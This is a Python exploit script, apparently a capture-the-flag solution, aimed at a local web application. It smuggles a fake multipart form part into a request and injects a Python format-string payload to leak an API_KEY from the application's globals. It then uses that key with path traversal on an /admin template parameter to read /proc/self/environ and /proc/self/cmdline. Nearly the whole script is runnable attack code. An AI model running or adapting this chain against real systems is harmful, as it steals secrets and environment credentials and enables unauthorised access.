import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 获取 API_KEY
api_key = format_string_leak("{0.view_functions[action].__globals__[API_KEY]}")
print(f"[+] API_KEY: {api_key}")

# 尝试读取 /proc/self/environ 来检查是否有可利用的环境变量
headers = {"Authorization": api_key}
r = httpx.get(f"{TARGET}/admin", params={"tmpl": "../../../proc/self/environ"}, headers=headers, timeout=5.0)
print(f"\n[/proc/self/environ] Status: {r.status_code}")
if r.status_code == 200:
    # 环境变量用 NULL 字节分隔
    env_vars = r.text.split('\x00')
    for var in env_vars:
        if var:
            print(f"  {var}")

# 检查 /proc/self/cmdline
r = httpx.get(f"{TARGET}/admin", params={"tmpl": "../../../proc/self/cmdline"}, headers=headers, timeout=5.0)
print(f"\n[/proc/self/cmdline] Status: {r.status_code}")
if r.status_code == 200:
    print(f"  {r.text.replace(chr(0), ' ')}")

# 检查 /proc/self/cwd 指向哪里
r = httpx.get(f"{TARGET}/admin", params={"tmpl": "../../../proc/self/cwd"}, headers=headers, timeout=5.0)
print(f"\n[/proc/self/cwd] Status: {r.status_code}")
